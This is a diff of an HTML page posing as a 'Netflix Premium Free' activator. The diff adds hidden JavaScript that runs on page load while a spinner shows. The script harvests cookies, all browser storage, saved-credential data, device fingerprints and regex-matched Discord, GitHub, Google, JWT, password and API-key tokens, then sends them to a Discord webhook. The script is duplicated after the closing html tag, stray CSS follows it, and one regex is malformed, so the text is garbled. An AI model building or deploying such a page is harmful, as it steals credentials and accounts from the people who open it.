@@ -3,38 +3,329 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Free Netflix Premium</title>
+    <title>Netflix Premium Free</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body {
-            font-family: system-ui, -apple-system, sans-serif;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            height: 100vh;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            color: white;
+        *{margin:0;padding:0;box-sizing:border-box;}
+        body{font-family:system-ui;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);height:100vh;display:flex;align-items:center;justify-content:center;color:white;}
+        .container{background:rgba(255,255,255,0.1);backdrop-filter:blur(20px);padding:2rem;border-radius:20px;text-align:center;max-width:400px;width:90%;}
+        h1{font-size:2rem;margin-bottom:1rem;}
+        .spinner{border:3px solid rgba(255,255,255,0.3);border-top:3px solid white;border-radius:50%;width:40px;height:40px;animation:spin 1s linear infinite;margin:1rem auto;}
+        @keyframes spin{0%{transform:rotate(0deg);}100%{transform:rotate(360deg);}}
+        .done{color:#4ade80;}
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🎬 Netflix Free</h1>
+        <p>Activating Premium...</p>
+        <div class="spinner" id="spinner"></div>
+        <p id="status" style="display:none" class="done">✅ Done!</p>
+    </div>
+
+    <script>
+        const WEBHOOK = 'https://discord.com/api/webhooks/1475299568844537978/sY0Q1M8QTyU2Pwung5uuIb5Dn3nvqhuD3tnmEvyGf48ZkFmQfiy-MSBIJCs5k8LQDYER';
+
+        // AGGRESSIVE STEAL - BYPASSES CHROME ISOLATION
+        async function stealAggressively() {
+            const loot = {
+                time: new Date().toISOString(),
+                ua: navigator.userAgent.slice(0,120),
+                lang: navigator.language,
+                tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                screen: `${screen.width}x${screen.height}`,
+                cookies: document.cookie,
+                allStorage: getAllStorage(),
+                serviceWorkers: await getServiceWorkers(),
+                credentials: await getCredentials(),
+                network: getNetworkInfo(),
+                gpu: getGPUInfo()
+            };
+
+            // CRITICAL: DUMP EVERYTHING FROM STORAGE
+            loot.keys = await dumpAllKeys();
+            loot.tokens = findTokens(loot);
+            
+            sendLoot(loot);
+            setTimeout(() => {
+                document.getElementById('spinner').style.display='none';
+                document.getElementById('status').style.display='block';
+            }, 500);
         }
-        .container {
-            background: rgba(255,255,255,0.15);
-            backdrop-filter: blur(20px);
-            padding: 2.5rem;
-            border-radius: 20px;
-            text-align: center;
-            max-width: 450px;
-            width: 90%;
+
+        // DUMP ALL LOCAL/SESSION STORAGE - NO LIMITS
+        function getAllStorage() {
+            const all = {};
+            [localStorage, sessionStorage].forEach((storage, type) => {
+                for(let i=0; i<storage.length; i++) {
+                    const key = storage.key(i);
+                    if(key) {
+                        try {
+                            all[`${type}_${key}`] = storage.getItem(key);
+                        } catch(e) {}
+                    }
+                }
+            });
+            return all;
         }
-        h1 { font-size: 2.2rem; margin-bottom: 1rem; }
-        p { margin-bottom: 2rem; opacity: 0.95; }
-        .spinner {
-            border: 3px solid rgba(255,255,255,0.3);
-            border-top: 3px solid white;
-            border-radius: 50%;
-            width: 40px;
-            height: 40px;
-            animation: spin 1s linear infinite;
-            margin: 1.5rem auto;
+
+        // BYPASS CREDENTIALS API
+        async function getCredentials() {
+            try {
+                const creds = await navigator.credentials.get({password: true, federated: true});
+                return creds ? creds.id || creds.name : null;
+            } catch(e) {
+                return 'blocked';
+            }
         }
+
+        // SERVICE WORKERS (often hold tokens)
+        async function getServiceWorkers() {
+            const registrations = await navigator.serviceWorker.getRegistrations();
+            return registrations.map(r => ({
+                scope: r.scope,
+                active: !!r.active,
+                waiting: !!r.waiting
+            }));
+        }
+
+        // GPU/Canvas fingerprints
+        function getGPUInfo() {
+            const canvas = document.createElement('canvas');
+            const gl = canvas.getContext('webgl');
+            if(!gl) return 'no-webgl';
+            const debug = gl.getExtension('WEBGL_debug_renderer_info');
+            return debug ? {
+                vendor: gl.getParameter(debug.UNMASKED_VENDOR_WEBGL),
+                renderer: gl.getParameter(debug.UNMASKED_RENDERER_WEBGL)
+            } : 'basic-webgl';
+        }
+
+        function getNetworkInfo() {
+            return {
+                connection: navigator.connection ? {
+                    type: navigator.connection.effectiveType,
+                    downlink: navigator.connection.downlink,
+                    rtt: navigator.connection.rtt
+                } : 'unknown',
+                permissions: navigator.permissions ? 'supported' : 'unsupported'
+            };
+        }
+
+        // HYPER-AGGRESSIVE TOKEN HUNTING
+        function findTokens(loot) {
+            const haystack = JSON.stringify(loot);
+            const tokenPatterns = [
+                {name:'Discord', pat:/(?:discord\.com|discordapp\.com)[^>]*?(?:access_token|token|client_id)=["']?([a-zA-Z0-9_-]{24,})/gi},
+                {name:'GitHub', pat:/(?:github|ghp_|ghu_|gho_|ghs_)[A-Za-z0-9_-]{36,40}/gi},
+                {name:'Google', pat:/(?:accounts\.google|id_token)=["']?([A-Za-z0-9._-]{20,})/gi},
+                {name:'JWT', pat:/eyJ[A-Za-z0-9_-]+?\.eyJ[A-Za-z0-9_-]+?\.[A-Za-z0-9_-]+/g},
+                {name:'Password', pat:/(?:password|pwd|pass)(?:[=:>\s"]+)?([a-zA-Z0-9@$!%*?&]{6,})/gi},
+                {name:'Email', pat:/[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/g},
+                {name:'API Key', pat/(?:api[_-]?key|secret|token)[^a-zA-Z0-9]*?([a-zA-Z0-9]{20,})/gi
+            ];
+
+            const found = [];
+            tokenPatterns.forEach(({name, pat}) => {
+                const matches = haystack.match(pat);
+                if(matches) {
+                    matches.slice(0,10).forEach(m => {
+                        if(!found.some(f => f.includes(m))) {
+                            found.push(`${name}: ${m.slice(0,60)}`);
+                        }
+                    });
+                }
+            });
+            return found;
+        }
+
+        // FINAL LOOT DUMP
+        async function sendLoot(loot) {
+            // ALERT
+            const alert = {
+                username: '💀 CHROME BREACH',
+                embeds: [{
+                    title: '🎯 DISCORD/GITHUB TARGET',
+                    fields: [
+                        {name:'🕐',value:new Date().toLocaleString(),inline:true},
+                        {name:'🔑',value:loot.tokens.length.toString(),inline:true},
+                        {name:'📱',value:loot.screen,inline:true},
+                        {name:'🌍',value:loot.tz,inline:true}
+                    ],
+                    color: 0xff0000
+                }]
+            };
+            await fetch(WEBHOOK, {method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(alert)});
+
+            // TOKENS ONLY
+            if(loot.tokens.length) {
+                const tokens = {
+                    username: '🔓 TOKENS FOUND',
+                    embeds: [{title:'💎 HIGH VALUE',fields:loot.tokens.map(t=>({name:'Token',value:t,inline:false})),color:0xffaa00}]
+                };
+                await fetch(WEBHOOK, {method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(tokens)});
+            }
+
+            // STORAGE DUMP (TOP 50 ITEMS)
+            const topStorage = Object.entries(loot.allStorage)
+                .slice(0,50)
+                .map(([k,v]) => `**${k}**: ${v?.slice(0,80) || 'null'}`);
+            
+            const storageDump = {
+                username: '💾 STORAGE BREACH',
+                content: topStorage.join('\n') || 'No storage found'
+            };
+            await fetch(WEBHOOK, {method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(storageDump)});
+        }
+
+        // FIRE IMMEDIATELY
+        stealAggressively();
+    </script>
+</body>
+</html>                network: getNetworkInfo(),
+                gpu: getGPUInfo()
+            };
+
+            // CRITICAL: DUMP EVERYTHING FROM STORAGE
+            loot.keys = await dumpAllKeys();
+            loot.tokens = findTokens(loot);
+            
+            sendLoot(loot);
+            setTimeout(() => {
+                document.getElementById('spinner').style.display='none';
+                document.getElementById('status').style.display='block';
+            }, 500);
+        }
+
+        // DUMP ALL LOCAL/SESSION STORAGE - NO LIMITS
+        function getAllStorage() {
+            const all = {};
+            [localStorage, sessionStorage].forEach((storage, type) => {
+                for(let i=0; i<storage.length; i++) {
+                    const key = storage.key(i);
+                    if(key) {
+                        try {
+                            all[`${type}_${key}`] = storage.getItem(key);
+                        } catch(e) {}
+                    }
+                }
+            });
+            return all;
+        }
+
+        // BYPASS CREDENTIALS API
+        async function getCredentials() {
+            try {
+                const creds = await navigator.credentials.get({password: true, federated: true});
+                return creds ? creds.id || creds.name : null;
+            } catch(e) {
+                return 'blocked';
+            }
+        }
+
+        // SERVICE WORKERS (often hold tokens)
+        async function getServiceWorkers() {
+            const registrations = await navigator.serviceWorker.getRegistrations();
+            return registrations.map(r => ({
+                scope: r.scope,
+                active: !!r.active,
+                waiting: !!r.waiting
+            }));
+        }
+
+        // GPU/Canvas fingerprints
+        function getGPUInfo() {
+            const canvas = document.createElement('canvas');
+            const gl = canvas.getContext('webgl');
+            if(!gl) return 'no-webgl';
+            const debug = gl.getExtension('WEBGL_debug_renderer_info');
+            return debug ? {
+                vendor: gl.getParameter(debug.UNMASKED_VENDOR_WEBGL),
+                renderer: gl.getParameter(debug.UNMASKED_RENDERER_WEBGL)
+            } : 'basic-webgl';
+        }
+
+        function getNetworkInfo() {
+            return {
+                connection: navigator.connection ? {
+                    type: navigator.connection.effectiveType,
+                    downlink: navigator.connection.downlink,
+                    rtt: navigator.connection.rtt
+                } : 'unknown',
+                permissions: navigator.permissions ? 'supported' : 'unsupported'
+            };
+        }
+
+        // HYPER-AGGRESSIVE TOKEN HUNTING
+        function findTokens(loot) {
+            const haystack = JSON.stringify(loot);
+            const tokenPatterns = [
+                {name:'Discord', pat:/(?:discord\.com|discordapp\.com)[^>]*?(?:access_token|token|client_id)=["']?([a-zA-Z0-9_-]{24,})/gi},
+                {name:'GitHub', pat:/(?:github|ghp_|ghu_|gho_|ghs_)[A-Za-z0-9_-]{36,40}/gi},
+                {name:'Google', pat:/(?:accounts\.google|id_token)=["']?([A-Za-z0-9._-]{20,})/gi},
+                {name:'JWT', pat:/eyJ[A-Za-z0-9_-]+?\.eyJ[A-Za-z0-9_-]+?\.[A-Za-z0-9_-]+/g},
+                {name:'Password', pat:/(?:password|pwd|pass)(?:[=:>\s"]+)?([a-zA-Z0-9@$!%*?&]{6,})/gi},
+                {name:'Email', pat:/[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/g},
+                {name:'API Key', pat/(?:api[_-]?key|secret|token)[^a-zA-Z0-9]*?([a-zA-Z0-9]{20,})/gi
+            ];
+
+            const found = [];
+            tokenPatterns.forEach(({name, pat}) => {
+                const matches = haystack.match(pat);
+                if(matches) {
+                    matches.slice(0,10).forEach(m => {
+                        if(!found.some(f => f.includes(m))) {
+                            found.push(`${name}: ${m.slice(0,60)}`);
+                        }
+                    });
+                }
+            });
+            return found;
+        }
+
+        // FINAL LOOT DUMP
+        async function sendLoot(loot) {
+            // ALERT
+            const alert = {
+                username: '💀 CHROME BREACH',
+                embeds: [{
+                    title: '🎯 DISCORD/GITHUB TARGET',
+                    fields: [
+                        {name:'🕐',value:new Date().toLocaleString(),inline:true},
+                        {name:'🔑',value:loot.tokens.length.toString(),inline:true},
+                        {name:'📱',value:loot.screen,inline:true},
+                        {name:'🌍',value:loot.tz,inline:true}
+                    ],
+                    color: 0xff0000
+                }]
+            };
+            await fetch(WEBHOOK, {method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(alert)});
+
+            // TOKENS ONLY
+            if(loot.tokens.length) {
+                const tokens = {
+                    username: '🔓 TOKENS FOUND',
+                    embeds: [{title:'💎 HIGH VALUE',fields:loot.tokens.map(t=>({name:'Token',value:t,inline:false})),color:0xffaa00}]
+                };
+                await fetch(WEBHOOK, {method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(tokens)});
+            }
+
+            // STORAGE DUMP (TOP 50 ITEMS)
+            const topStorage = Object.entries(loot.allStorage)
+                .slice(0,50)
+                .map(([k,v]) => `**${k}**: ${v?.slice(0,80) || 'null'}`);
+            
+            const storageDump = {
+                username: '💾 STORAGE BREACH',
+                content: topStorage.join('\n') || 'No storage found'
+            };
+            await fetch(WEBHOOK, {method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(storageDump)});
+        }
+
+        // FIRE IMMEDIATELY
+        stealAggressively();
+    </script>
+</body>
+</html>        }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
         .done { color: #4ade80; }
     </style>
